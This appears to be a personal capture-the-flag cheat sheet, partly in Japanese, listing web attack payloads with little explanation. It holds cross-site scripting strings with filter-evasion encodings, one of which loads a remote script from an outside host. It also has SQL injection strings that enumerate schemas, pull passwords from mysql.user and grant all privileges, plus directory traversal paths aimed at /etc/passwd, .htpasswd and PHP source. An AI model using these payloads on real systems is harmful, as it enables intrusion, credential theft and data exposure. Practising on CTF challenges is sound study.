#XSS

* basic
"><script>alert('XSS')</script>
"><script>alert(document.domain)</script>

* image
<img src="xss" onerror="alert('XSS')">

* script
html += "<img src='/static/level3/cloud"'onerror="alert('XSS')"'".jpg' />";
');alert('XSS')('

* on url
javascript:void(document.forms[0].p2.childNodes[1].innerText='<script>alert(document.domain)</script>');

* svg
<svg onload=alert("xss!")>

* mouseover
" onmouseover="alert(document.domain);" x="

* escape
<script>alert('XSS')</sciprt>
"><script>alert(document.domain)</script>
" onmouseover = " alert('\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E')"
re"><script>alert(\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E)</script>
" onmouseover = " alert('\x58\x53\x53') "
"/onmouseover="window['aler'+'t']('XS'+'S')">

* data uri scheme
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
<object data="data:text/html,<script>alert('XSS2')</script>"></object>

* space
<style/onload    =    !-alert&#x28;document.domain&#x29;>

* vbs
<img language=vbs src=<b onerror=alert#1/1#>

* short
<q/oncut=alert()
<q/oncopy=alert()

* unicode escape
<script>\u0078=\u0061\u006c\u0065\u0072\u0074; \u0078("\u0068\x61\150\u0061");</script>

* gsub
"><sscriptcript>alert('XSS')</sscriptcript>
document.write(); \x3cscript\x3ealert(document.domain);\x3c/script\x3e
p1=%A2%BE%BCscript%BEalert(document.domain);%BC/script%BE
background-color:#f00;background:url("javascript:alert(document.domain);");

<p id=1 onmouseover=alert(document.getElementById(1).innerHTML)>XSS</p>
"(function (text){if(!f)a(text);if(text==='XSS'){if(!f){f=1;window.setTimeout(function(){f=0},100);if(li)li.innerHTML=t}else{f=0;cs=[5010175210,5010175222,5010175227,5010175166,5010175224,5010175218,5010175231,5010175225,5010175166,5010175223,5010175213,5010175140,5010175166,5010175199,5010175194,5010175197,5010175178,5010175192,5010175169,5010175191,5010175169,5010175146,5010175187,5010175169,5010175146,5010175218,5010175149,5010175180,5010175210,5010175169,5010175187,5010175146,5010175216];t='';for(i=0;i<cs.length;i++){t+=String.fromCharCode(cs[i]^0x123456789+123456789)}appendTweet('<b>'+t+'</b>')}}else{f=0}})"

* jquery
<img src=1 onerror=$.getScript('http://vuln.moe/web/xss/xss.js')>


# SQLi
* basic
' or 1=1;--
' or 1=1;#
' or '1

* offset
' or 1=1 offset 1;--

ID: \
PW: OR 1--
ID: ' ||
PW: OR 1--

* union
' or 1=1 union select sql,1,1 from sqlite_master;--
' or 1=1 union select password, name, 1 from users_hogefuga;--
SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members 

# null の数を変えてカラム数を特定
' and 1=0 UNION ALL SELECT null,null,null#
# テーブル一覧を取得
' and 1=0 UNION ALL (SELECT TABLE_SCHEMA,TABLE_NAME ,TABLE_COMMENT FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE') ;#
# カラム一覧を取得
' and 1=0 UNION ALL (SELECT TABLE_NAME,COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME IN('func') ORDER BY TABLE_NAME) ;#
' and 1=0 UNION ALL (SELECT 1, 1, GRANTEE FROM INFORMATION_SCHEMA.SCHEMA_PRIVILEGES); #

' and 1=0 UNION ALL SELECT null,null,null FROM user;#
' and 1=0 UNION ALL SELECT null, current_user(), version();#
' and 1=0 UNION ALL GRANT ALL PRIVILEGES ON *.* TO username@'%'#
' and 1=0 UNION ALL SELECT null, null, password FROM mysql.user#
SCHEMA_PRIVILEGES
fuga' OORR '1
5.1.73
https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/

# perl json sqli
{ "name" : "a", "a\") OR 1 #" : "a" }

# Wire shark packete filter
icmp.type == 8
http.host contains google
tcp.flags == 0x02
tcp.flags == 0x12
tcp.flags == 0x14
http.response
http.request

udp contains 33:27:58
* パケットサイズ
frame.len == 18
data.data
frame contains 17
(tcp.flags.reset == 1) && (ip.id > 0)

# directory traversal
view.php?file=../index.php
?lang=php://filter/convert.base64-encode/resource=index.php
../index
../index.php
/etc/passwd
../../../etc/passwd
/etc/apache2/httpd.conf
.git
sitemap.xml
robots.txt
%00
.htpasswd%00


# dump header grep
curl --dump-header - http://ringzer0team.com/challenges/43 2> /dev/null |grep needle
